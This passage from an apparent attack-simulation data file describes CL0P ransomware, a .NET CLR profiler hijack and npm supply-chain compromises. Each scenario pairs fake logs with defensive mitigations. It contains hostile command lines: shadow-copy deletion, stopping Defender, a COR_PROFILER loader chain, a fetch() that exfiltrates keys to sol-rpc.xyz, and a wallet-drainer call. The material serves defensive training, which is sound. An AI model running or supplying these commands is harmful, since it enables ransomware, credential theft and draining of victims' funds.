          'Block `mshta.exe` execution via Attack Surface Reduction (ASR) rules and isolate hosts creating `.8base` or `info.hta` artifacts.',
        logs: [
          {
            id: '8base-3',
            timestamp: '09:09:48.882',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'phobos_8base.exe',
            raw: 'EventID: 11 | Image: C:\\Users\\Public\\phobos_8base.exe | TargetFilename: D:\\Accounting\\Payroll.xlsx.id[8F2A1C9E].[support@8base.vc].8base | RansomNote: info.hta & info.txt',
            parsedFields: {
              RansomwareFamily: '8Base (Phobos Ransomware-as-a-Service Variant)',
              FilePattern: '*.id[<victim_id>].[support@8base.vc].8base',
              HtmlRansomNote: 'info.hta launched via mshta.exe',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'cl0p-truebot-flawedgrace-sdbbot-ransomware',
    title: 'CISA AA23-158A, Microsoft & Mandiant — CL0P (TA505 / FIN11) Ransomware: TrueBot Loader, FlawedGrace RAT, SDBbot & Signed Binary Mass Share Encryption (.CIop)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI Joint Cybersecurity Advisory AA23-158A (#StopRansomware: CL0P Ransomware Gang), Microsoft Threat Intelligence (Lace Tempest), and Mandiant FIN11 research: CL0P operators deploy TrueBot (Silence.Downloader) and FlawedGrace RAT, pivot laterally with Cobalt Strike and SDBbot, terminate over 600 Windows processes and services, and execute a digitally signed CL0P ransomware binary (`.CIop` / `ClopReadMe.txt`).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'CL0P / TA505 / FIN11 Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'TrueBot (Silence.Downloader) & FlawedGrace RAT', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'AD Staging Server (Cobalt Strike + SDBbot)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-158A / Microsoft Defender XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise File Servers (.CIop / ClopReadMe.txt)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: TrueBot (`Silence.Downloader`) Execution & FlawedGrace / SDBbot RAT Deployment',
        narration:
          'Following initial access via spearphishing or MFT/web zero-days, CL0P operators execute `TrueBot` (tracked by CISA AA23-158A as `Silence.Downloader`) via `rundll32.exe` or a signed loader. TrueBot collects Active Directory domain controller details (`ipconfig /all`, `net view /all /domain`) and downloads the `FlawedGrace` full-featured C++ RAT and `SDBbot`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Execution & Command and Control (T1218.011 / T1105 - Ingress Tool Transfer)',
        technicalCommands: [
          'rundll32.exe C:\\ProgramData\\truebot.dll,RunMain (TrueBot / Silence.Downloader C2 check-in)',
          'svchost.exe (Injected FlawedGrace RAT over custom binary TCP port 443 protocol & SDBbot installer)',
        ],
        defenseMitigation:
          'Detect TrueBot (`Silence.Downloader`) C2 beacon patterns and alert on `rundll32.exe` loading unsigned DLLs from `C:\\ProgramData` that immediately spawn `net.exe view /domain`.',
        logs: [
          {
            id: 'cl0p-rw-1',
            timestamp: '10:02:18.410',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'rundll32.exe',
            CommandLine: 'rundll32.exe C:\\ProgramData\\truebot.dll,RunMain',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\rundll32.exe | CommandLine: rundll32.exe C:\\ProgramData\\truebot.dll,RunMain | Stage2Payloads: FlawedGrace RAT & SDBbot | ThreatActor: TA505 / FIN11 / Lace Tempest (CISA AA23-158A)',
            parsedFields: {
              InitialLoader: 'TrueBot (Silence.Downloader)',
              SecondStageRats: 'FlawedGrace RAT & SDBbot',
              AdvisoryId: 'CISA AA23-158A (#StopRansomware: CL0P)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Mass Termination of 600+ Processes & Services (`net stop`) & TinyMet Cobalt Strike Pivot',
        narration:
          'Using `TinyMet` (a tiny meterpreter/Cobalt Strike stager) to move laterally to domain controllers and file servers, the operator launches the CL0P binary, which contains a hardcoded loop that stops over 600 Windows services (`SQLWriter`, `Veeam`, `BackupExec`, `DefWatch`) and kills office, database, and backup processes so every file handle on the server is unlocked.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Impact Preparation (T1489 - Service Stop)',
        technicalCommands: [
          'net.exe stop "SQLWriter" /y && net.exe stop "VeeamBackupSvc" /y && net.exe stop "WinDefend" /y',
          'vssadmin.exe delete shadows /all /quiet && bcdedit.exe /set {default} recoveryenabled No',
        ],
        defenseMitigation:
          'Monitor high-velocity `net.exe stop` bursts (>10 service stop commands within 30 seconds) and verify Authenticode certificate revocation lists (OCSP/CRL).',
        logs: [
          {
            id: 'cl0p-rw-2',
            timestamp: '10:07:55.120',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cl0p.exe',
            CommandLine: 'C:\\Windows\\Temp\\cl0p.exe',
            raw: 'EventID: 1 | Image: C:\\Windows\\Temp\\cl0p.exe | Signature: Signed with Stolen/Fraudulent Code-Signing Certificate | Action: Terminating 618 hardcoded Windows processes & services + vssadmin delete shadows',
            parsedFields: {
              CodeSigningAbuse: 'Signed with stolen/expired Authenticode certificate (T1553.002)',
              HardcodedKillList: '600+ Windows services and database/backup processes',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: RC4 / AES + RSA-1024 Encryption (`.CIop`) & `ClopReadMe.txt` Extortion Demand',
        narration:
          'CL0P spawns dedicated worker threads for local drives and enumerated SMB network shares, encrypting files with RC4 or AES-256 and protecting the symmetric key with an embedded 1024-bit RSA public key, appending `.CIop` (or `.Cllp`) and writing `ClopReadMe.txt` (`README_!_CIop_!.txt`).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'cl0p.exe -> CryptGenRandom() -> CryptEncrypt(RC4/AES-256) + RSA-1024 key wrap -> *.CIop',
          'WriteFile("ClopReadMe.txt") across all encrypted directories',
        ],
        defenseMitigation:
          'Enforce SMB network segmentation, revoke compromised code-signing certificates via WDAC, and maintain immutable offline backups.',
        logs: [
          {
            id: 'cl0p-rw-3',
            timestamp: '10:12:30.604',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'cl0p.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\cl0p.exe | TargetFilename: \\\\corp-fs01\\shares\\ClopReadMe.txt | AppendedExtension: .CIop | Actor: CL0P / FIN11 / TA505',
            parsedFields: {
              RansomwareFamily: 'CL0P Ransomware',
              AppendedExtension: '.CIop / .Cllp',
              RansomNote: 'ClopReadMe.txt',
            },
          },
        ],
        packets: [],
      },
    ],
  },

  // ============================================================================
  // PART 2: PIKERED CLR PROFILER TRUSTED-BINARY LOADER CHAIN (MALWARE)
  // ============================================================================
  {
    id: 'pikered-clr-profiler-trusted-binary-loader-chain',
    title: 'PikeRed Research & MITRE T1574.012 — Abusing the .NET CLR Profiler: VHDX MotW Bypass & Trusted-Binary Loader Chain (KeePass.exe -> clr.dll)',
    category: 'MALWARE',
    mitreId: 'T1574.012',
    description:
      'Grounded in PikeRed cybersecurity research ("Abusing the CLR Profiler: A Trusted-Binary Loader Chain for Initial Access") and MITRE ATT&CK T1574.012: an attacker delivers a weaponized `.vhdx` container that strips Mark-of-the-Web (`Zone.Identifier` ADS) upon mounting, conceals operational binaries using Windows `Hidden` + `System` (`+h +s`) file attributes, and sets `.NET` Common Language Runtime (CLR) diagnostic environment variables (`COR_ENABLE_PROFILING=1`, `COR_PROFILER`, `COR_PROFILER_PATH`) before launching a signed, trusted `.NET` application (`KeePass.exe`) so `clr.dll!ProfilingAPIUtility::LoadProfiler` automatically loads an unmanaged COM profiler DLL (`ICorProfilerCallback::Initialize`) in-process.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Initial Access Delivery (Weaponized .vhdx)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Mounted VHDX Volume (MotW Stripped + attrib +h +s)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Launcher Setting COR_ENABLE_PROFILING=1 & COR_PROFILER_PATH', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'PikeRed / Sysmon EID 1, 7 & VHDMP Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Signed KeePass.exe -> clr.dll -> ICorProfilerCallback::Initialize', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: VHDX Container Mounting (MotW Bypass) & `attrib +h +s` Super-Hidden File Concealment',
        narration:
          'The user opens a weaponized `.vhdx` virtual hard disk (`Payroll_2026.vhdx`). Windows mounts the virtual disk via `vhdmp.sys` (logging VHDMP Operational EventID 1 / 12), and because NTFS `Zone.Identifier` Mark-of-the-Web (MotW) streams are not propagated to files inside mounted VHDX volumes, SmartScreen is bypassed. Inside the mounted drive (`E:\\`), the signed `.NET` host binary (`KeePass.exe`) and custom profiler DLL (`ProfilerLoader.dll`) are marked with both `FILE_ATTRIBUTE_HIDDEN` and `FILE_ATTRIBUTE_SYSTEM` (`attrib +h +s`), leaving only a single decoy shortcut visible in Explorer even when "Show hidden files" is enabled.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Initial Access & Defense Evasion (T1553.005 - Mark-of-the-Web Bypass / T1564.001 - Hidden Files)',
        technicalCommands: [
          'Mount-DiskImage -ImagePath "C:\\Users\\victim\\Downloads\\Payroll_2026.vhdx" (Mounts volume E:\\ without Zone.Identifier MotW)',
          'attrib.exe +h +s E:\\.runtime\\KeePass.exe && attrib.exe +h +s E:\\.runtime\\ProfilerLoader.dll',
        ],
        defenseMitigation:
          'Block `.vhdx`, `.vhd`, and `.iso` auto-mounting via Group Policy or file-extension association hardening, and correlate `Microsoft-Windows-VHDMP-Operational` EventID 12 with process creation from newly mounted drive letters.',
        logs: [
          {
            id: 'pikered-1',
            timestamp: '11:04:10.115',
            source: 'Windows Event Log',
            severity: 'critical',
            EventCode: 12,
            ProcessName: 'explorer.exe',
            raw: 'LogName: Microsoft-Windows-VHDMP-Operational | EventID: 12 | VhdFile: C:\\Users\\victim\\Downloads\\Payroll_2026.vhdx | MountedVolume: E:\\ | FileAttributes: FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM (+h +s) on E:\\.runtime\\* | Reference: PikeRed CLR Profiler Research',
            parsedFields: {
              ContainerFormat: 'VHDX Virtual Hard Disk (Bypassing NTFS Zone.Identifier MotW)',
              FileConcealment: 'attrib +h +s (Hidden + System super-hidden attributes)',
              VisibleTrigger: 'Decoy LNK Shortcut on Mounted Volume E:\\',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Process Environment Seeding (`COR_ENABLE_PROFILING=1`, `COR_PROFILER`, `COR_PROFILER_PATH`)',
        narration:
          'When the user double-clicks the decoy shortcut on `E:\\`, the execution trigger populates three Common Language Runtime (CLR) profiling variables inside the child process environment block—`COR_ENABLE_PROFILING=1`, `COR_PROFILER={B7A3F9E1-4C2D-4A8B-9E10-C1D2E3F4A5B6}`, and `COR_PROFILER_PATH=E:\\.runtime\\ProfilerLoader.dll`—and immediately spawns the legitimate, digitally signed `.NET` application (`KeePass.exe`) without writing any registry keys (`HKCU\\Software\\Classes\\CLSID` is not needed when `COR_PROFILER_PATH` is used on .NET 4+).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence, Privilege Escalation & Defense Evasion (T1574.012 - Hijack Execution Flow: COR_PROFILER)',
        technicalCommands: [
          'cmd.exe /c "set COR_ENABLE_PROFILING=1 && set COR_PROFILER={B7A3F9E1-4C2D-4A8B-9E10-C1D2E3F4A5B6} && set COR_PROFILER_PATH=E:\\.runtime\\ProfilerLoader.dll && start \"\" E:\\.runtime\\KeePass.exe"',
        ],
        defenseMitigation:
          'Inspect the `Environment` field in Sysmon EventID 1 or EDR process creation telemetry for `COR_ENABLE_PROFILING=1` and `COR_PROFILER_PATH=` on non-developer workstations.',
        logs: [
          {
            id: 'pikered-2',
            timestamp: '11:04:14.380',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'KeePass.exe',
            CommandLine: 'E:\\.runtime\\KeePass.exe',
            raw: 'EventID: 1 | Image: E:\\.runtime\\KeePass.exe | Signed: true (Dominik Reichl / Trusted .NET Assembly) | Environment: COR_ENABLE_PROFILING=1; COR_PROFILER={B7A3F9E1-4C2D-4A8B-9E10-C1D2E3F4A5B6}; COR_PROFILER_PATH=E:\\.runtime\\ProfilerLoader.dll',
            parsedFields: {
              TrustedHostBinary: 'KeePass.exe (Legitimate Signed .NET Framework Executable)',
              CorEnableProfiling: 'COR_ENABLE_PROFILING=1',
              CorProfilerGuid: '{B7A3F9E1-4C2D-4A8B-9E10-C1D2E3F4A5B6}',
              CorProfilerPath: 'E:\\.runtime\\ProfilerLoader.dll (Registry-free .NET 4+ loading)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: `mscoree.dll` -> `clr.dll!ProfilingAPIUtility::LoadProfiler` & `ICorProfilerCallback::Initialize` Execution',
        narration:
          'During `KeePass.exe` startup, the .NET shim (`mscoree.dll`) initializes the Common Language Runtime (`clr.dll`). `clr.dll!ProfilingAPIUtility::LoadProfiler` reads `COR_ENABLE_PROFILING=1` and `COR_PROFILER_PATH`, loads the unmanaged C++ COM server `ProfilerLoader.dll` into `KeePass.exe` via `LoadLibraryW`, resolves `DllGetClassObject` + `IClassFactory::CreateInstance`, and invokes `ICorProfilerCallback::Initialize(IUnknown *pICorProfilerInfoUnk)`, executing the attacker’s payload inside the trusted `KeePass.exe` process without any cross-process injection API calls.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion & Execution (T1574.012 - COR_PROFILER / Trusted-Binary Loader Chain)',
        technicalCommands: [
          'clr.dll!ProfilingAPIUtility::LoadProfiler() -> LoadLibraryW("E:\\.runtime\\ProfilerLoader.dll") -> DllGetClassObject()',
          'ProfilerLoader.dll!ICorProfilerCallback2::Initialize(pICorProfilerInfoUnk) -> Executes C2 loader inside signed KeePass.exe',
        ],
        defenseMitigation:
          'Correlate Windows Application Event Log ID `1022` (`.NET Runtime` profiler loaded notification) and Sysmon EventID 7 where a signed `.NET` binary loads an unsigned unmanaged DLL from a mounted VHDX or user-writable path.',
        logs: [
          {
            id: 'pikered-3',
            timestamp: '11:04:14.920',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 7,
            ProcessName: 'KeePass.exe',
            raw: 'EventID: 7 | Image: E:\\.runtime\\KeePass.exe | ImageLoaded: E:\\.runtime\\ProfilerLoader.dll | Signed: false | CallTrace: mscoree.dll -> clr.dll!ProfilingAPIUtility::LoadProfiler -> ProfilerLoader.dll!ICorProfilerCallback::Initialize | .NET Runtime EventID: 1022',
            parsedFields: {
              ClrRuntimeEngine: 'mscoree.dll -> clr.dll!ProfilingAPIUtility::LoadProfiler',
              ComEntryPoint: 'DllGetClassObject -> ICorProfilerCallback::Initialize()',
              DotNetEventLog: '.NET Runtime EventID 1022 (Profiler was loaded successfully)',
              ReferenceUrl: 'https://www.pikered.com/en/learn/abusing-the-clr-profiler-a-trusted-binary-loader-chain-for-initial-access/',
            },
          },
        ],
        packets: [],
      },
    ],
  },

  // ============================================================================
  // PART 3: 5 FAMOUS RECENT SUPPLY CHAIN ATTACKS (SUPPLY_CHAIN_CICD)
  // ============================================================================
  {
    id: 'rspack-solana-web3js-npm-supply-chain-2024',
    title: 'Solana Labs, Rspack Advisory & Socket.dev — @solana/web3.js & @rspack/core NPM Maintainer Compromise & Private Key / CI Token Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Grounded in official Solana/Anza and Rspack (ByteDance Web Infra) security post-mortems, Socket.dev, and Datadog Security Labs research: attackers compromise NPM maintainer publish tokens via spearphishing to push backdoored releases of `@solana/web3.js` (`1.95.6` / `1.95.7`) and `@rspack/core` (`1.1.7`), hooking `Keypair.fromSecretKey` and CI `postinstall` hooks to exfiltrate cryptographic private keys, GitHub tokens, and AWS credentials.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker C2 (sol-rpc.xyz CloudFlare Headers)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM Registry (@solana/web3.js@1.95.6 & @rspack/core@1.1.7)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Developer / CI Build Runner (npm install)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Socket.dev / NPM Provenance & Egress Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Keypair.fromSecretKey & CI Secrets Exfiltrated', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: NPM Maintainer Spearphishing, Token Hijack & Malicious Version Publication',
        narration:
          'Attackers spearphish an NPM package maintainer with publish privileges via a spoofed domain, hijack their NPM automation/publish token, and publish unauthorized minor versions (`@solana/web3.js@1.95.6` and `1.95.7`, and `@rspack/core@1.1.7`) directly to the public NPM registry without corresponding commits in the official GitHub repositories.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'npm publish @solana/web3.js@1.95.6 (Published to registry.npmjs.org without GitHub Release / SLSA Provenance)',
          'npm publish @rspack/core@1.1.7 (Contains malicious postinstall hook & hijacked binary loader)',
        ],
        defenseMitigation:
          'Enforce NPM `--provenance` (SLSA Build L2 attestation linking every published tarball to a verified GitHub Actions workflow commit) and pin exact dependency versions in `package-lock.json`.',
        logs: [
          {
            id: 'solana-sc-1',
            timestamp: '12:10:05.112',
            source: 'CloudTrail',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'npm-registry',
            raw: 'NPM Registry Audit | Package: @solana/web3.js@1.95.6 & 1.95.7 | MaintainerToken: Compromised via Phishing | GitHubCommitMatch: FALSE (Diff present only in registry tarball)',
            parsedFields: {
              CompromisedPackages: '@solana/web3.js (1.95.6, 1.95.7) & @rspack/core (1.1.7)',
              RootCause: 'Maintainer NPM publish token phishing & lack of mandatory provenance check',
              MitreId: 'T1195.002',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: `addToQueue` Hook Injection Inside `Keypair.fromSecretKey` & `fromSeed`',
        narration:
          'Downstream applications and CI/CD pipelines running `npm update` or unpinned caret ranges (`^1.95.0`) pull `@solana/web3.js@1.95.6`. Inside `index.cjs.js` and `index.esm.js`, the attacker injected an `addToQueue(secretKey)` helper directly into `Keypair.fromSecretKey()`, `Keypair.fromSeed()`, and `solana.OctetStream`, intercepting every raw Ed25519 private key in memory as soon as a wallet or backend bot signs a transaction.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Collection & Credential Access (T1552.004 - Unsecured Credentials: Private Keys)',
        technicalCommands: [
          'Keypair.fromSecretKey = function(secretKey, options) { addToQueue(secretKey); return new Keypair(...); }',
          'node_modules/@rspack/core/postinstall.js -> Harvests process.env.GITHUB_TOKEN, NPM_TOKEN & ~/.aws/credentials',
        ],
        defenseMitigation:
          'Use automated software composition analysis (Socket.dev, Snyk) to block package updates that introduce new network `fetch()` calls or `process.env` harvesting inside cryptographic libraries.',
        logs: [
          {
            id: 'solana-sc-2',
            timestamp: '12:14:33.704',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'node',
            CommandLine: 'node dist/trading-worker.js',
            raw: 'Runtime Supply Chain Alert | Module: node_modules/@solana/web3.js/lib/index.cjs.js | InjectedFunction: addToQueue(secretKey) inside Keypair.fromSecretKey | CapturedData: 64-byte Ed25519 SecretKey Uint8Array',
            parsedFields: {
              HookedApi: 'Keypair.fromSecretKey() & Keypair.fromSeed()',
              InjectedRoutine: 'addToQueue(secretKey) Base58/Hex serializer',
              SecondaryTarget: '@rspack/core@1.1.7 postinstall CI token stealer',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Disguised CloudFlare Header (`CF-Connecting-IP` / `CF-Ray`) Private Key Exfiltration to `sol-rpc.xyz`',
        narration:
          'To blend into normal RPC telemetry, `addToQueue()` encodes the stolen 64-byte private key into fake CloudFlare HTTP request headers (`CF-Connecting-IP`, `CF-Worker`, `CF-Ray`) and sends an HTTPS `POST` request to `https://sol-rpc.xyz/api/v1/bro`, allowing the attacker to immediately drain affected hot wallets and rotate stolen CI tokens.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration Over C2 Channel)',
        technicalCommands: [
          'fetch("https://sol-rpc.xyz/api/v1/bro", { method: "POST", headers: { "CF-Connecting-IP": encodedKeyPart1, "CF-Ray": encodedKeyPart2 } })',
        ],
        defenseMitigation:
          'Enforce strict egress allowlisting on signing backends and CI runners so `node` processes can only communicate with approved RPC endpoints.',
        logs: [
          {
            id: 'solana-sc-3',
            timestamp: '12:14:34.119',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'node',
            raw: 'EventID: 22 | Image: /usr/bin/node | QueryName: sol-rpc.xyz | HttpHeaders: CF-Connecting-IP / CF-Ray carrying hex-encoded Ed25519 private key',
            parsedFields: {
              ExfilDomain: 'https://sol-rpc.xyz/api/v1/bro',
              SteganographicChannel: 'Spoofed CloudFlare HTTP headers (CF-Connecting-IP, CF-Ray)',
            },
          },
        ],
        packets: [
          {
            id: 'solana-sc-pkt-3',
            timestamp: '12:14:34.250',
            protocol: 'HTTPS',
            sourceIp: '10.20.4.88',
            destIp: '172.67.148.92',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1024,
            hexDump: '50 4F 53 54 20 2F 61 70 69 2F 76 31 2F 62 72 6F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 73 6F 6C 2D 72 70 63 2E 78 79 7A',
            decodedString: 'POST /api/v1/bro HTTP/1.1 Host: sol-rpc.xyz (Exfiltrating Keypair.fromSecretKey bytes in CF headers)',
          },
        ],
      },
    ],
  },
  {
    id: 'lottie-player-npm-ace-supply-chain-2024',
    title: 'LottieFiles Incident Report, Snyk & Wiz — @lottiefiles/lottie-player NPM Supply Chain Compromise, Unpinned CDN Propagation & Web3 Drainer Injection',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Grounded in the official LottieFiles incident post-mortem, Snyk Security Labs, and Wiz Research: attackers compromise a developer’s NPM access token to publish malicious versions `2.0.5`, `2.0.6`, and `2.0.7` of the popular `@lottiefiles/lottie-player` animation component. Websites loading unpinned `<script src="https://unpkg.com/@lottiefiles/lottie-player@latest">` tags automatically serve a trojanized bundle that opens a WebSocket C2 to `wss://castleservices.org` and overlays an AceDrainer crypto phishing modal.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker C2 (wss://castleservices.org)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM & Unpinned CDN (unpkg / jsDelivr @latest)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Production Web App (@lottiefiles/lottie-player@2.0.7)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CSP / Subresource Integrity (SRI) Browser Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'End-User Browser DOM & Web3 Wallet (AceDrainer)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Compromised NPM Token Pushes `@lottiefiles/lottie-player` v2.0.5, v2.0.6 & v2.0.7',
        narration:
          'Using a compromised maintainer NPM token, the attacker publishes three rapid-fire versions (`2.0.5`, `2.0.6`, and `2.0.7`) of `@lottiefiles/lottie-player` to NPM. Public open-source CDNs (`unpkg.com` and `cdn.jsdelivr.net`) immediately mirror the new versions as `@latest` or `^2.0.0`.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'npm publish @lottiefiles/lottie-player@2.0.5 .. 2.0.7 -> Mirrored on https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js',
        ],
        defenseMitigation:
          'Never reference `@latest` or floating semver ranges in production `<script>` tags; always pin exact version numbers and enforce Subresource Integrity (`integrity="sha384-..."`).',
        logs: [
          {
            id: 'lottie-1',
            timestamp: '18:22:10.045',
            source: 'CloudTrail',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'npm-publish',
            raw: 'NPM Supply Chain Alert | Package: @lottiefiles/lottie-player | MaliciousVersions: 2.0.5, 2.0.6, 2.0.7 | CDNPropagation: unpkg.com & cdn.jsdelivr.net (@latest)',
            parsedFields: {
              PackageName: '@lottiefiles/lottie-player',
              MaliciousVersions: '2.0.5, 2.0.6, 2.0.7',
              CdnVector: 'Unpinned @latest script tags on unpkg.com & jsDelivr',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Obfuscated Bundle Execution & WebSocket C2 Handshake (`wss://castleservices.org`)',
        narration:
          'When a user visits any web application loading the unpinned `lottie-player.js` script, the obfuscated payload appended to the legitimate animation player executes in the victim’s browser origin, fingerprints `window.ethereum` / EIP-6963 wallet providers, and opens a persistent WebSocket channel to `wss://castleservices.org:8080`.',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Command and Control & Execution (T1059.007 - JavaScript / T1071.001 - Web Protocols)',
        technicalCommands: [
          'new WebSocket("wss://castleservices.org:8080") (Establishes real-time C2 from victim browser DOM)',
          'window.dispatchEvent(new Event("eip6963:requestProvider")) (Enumerates installed browser Web3 wallets)',
        ],
        defenseMitigation:
          'Deploy a strict `Content-Security-Policy` (`connect-src \'self\'`) to block unauthorized outbound WebSocket (`wss://`) connections from client browsers.',
        logs: [
          {
            id: 'lottie-2',
            timestamp: '18:25:41.902',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 403,
            ProcessName: 'chrome.exe',
            raw: 'CSP / Browser Telemetry Alert | ScriptSource: https://unpkg.com/@lottiefiles/lottie-player@2.0.7/dist/lottie-player.js | OutboundWebSocket: wss://castleservices.org:8080 | API: eip6963:requestProvider',
            parsedFields: {
              InjectedBundle: 'dist/lottie-player.js (v2.0.5 - v2.0.7)',
              WebSocketC2: 'wss://castleservices.org:8080',
              WalletDiscovery: 'window.ethereum & EIP-6963 Provider Enumeration',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Dynamic DOM Overlay Injection & AceDrainer `eth_sendTransaction` / `Permit2` Signing',
        narration:
          'Instructed by `wss://castleservices.org`, the injected script renders a pixel-perfect modal overlay inside the trusted web app’s DOM prompting the user to "Verify Wallet Connection", tricking them into signing an ERC-20 `Permit2` approval or `eth_sendTransaction` call to the AceDrainer smart contract.',
        activeNodes: ['ad', 'attacker', 'siem'],
        mitreTactic: 'Impact & Collection (T1185 - Browser Session Hijacking / T1565)',
        technicalCommands: [
          'document.body.appendChild(walletConnectOverlayModal) -> window.ethereum.request({ method: "eth_signTypedData_v4", params: [victimAddr, permit2Payload] })',
        ],
        defenseMitigation:
          'Enforce Subresource Integrity (`integrity="sha384-..." crossorigin="anonymous"`) on all third-party scripts so any upstream CDN mutation is immediately blocked by the browser.',
        logs: [
          {
            id: 'lottie-3',
            timestamp: '18:26:12.330',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 1001,
            ProcessName: 'lottie-player.js',
            raw: 'Web3 Drainer Execution | PayloadFamily: AceDrainer | DOMInjection: Fake WalletConnect Modal | RPCMethod: eth_signTypedData_v4 (Permit2 Unlimited Token Approval)',
            parsedFields: {
              DrainerFamily: 'AceDrainer',
              RpcMethodAbused: 'eth_signTypedData_v4 / eth_sendTransaction',
              DefenseControl: 'Subresource Integrity (SRI) + CSP connect-src',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'circleci-oauth-github-token-rotation-breach',
    title: 'CircleCI Official Security Alert, GitHub Security & CISA — CircleCI CI/CD Supply Chain Breach: Engineer macOS Infostealer, 2FA Session Theft & Customer Vault Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Grounded in the official CircleCI Incident Report (January 2023), GitHub Security Advisories, and CISA CI/CD Supply Chain Guidance: an attacker compromises a CircleCI site reliability engineer’s macOS laptop with infostealer malware, steals an active 2FA-authenticated SSO session cookie from browser storage, impersonates the engineer in production, and extracts customer environment variables, AWS IAM keys, and GitHub OAuth deployment tokens.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Threat Actor (Stolen macOS SSO Session Cookie)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Engineer macOS Laptop (Infostealer Malware)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CircleCI Production Bastion & KMS Key Service', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CircleCI / GitHub OAuth & AWS CloudTrail Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Customer CI/CD Secrets, SSH Keys & GitHub Tokens', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Engineer macOS Infostealer Infection & 2FA-Backed Browser Session Cookie Theft',
        narration:
          'An engineer’s corporate macOS laptop is infected by trojanized third-party software carrying an infostealer that bypasses standard antivirus detections and extracts active browser session cookies and local SSH/GPG keys, including a valid, already-2FA-authenticated CircleCI production administrative SSO session token.',
        activeNodes: ['attacker', 'firewall'],
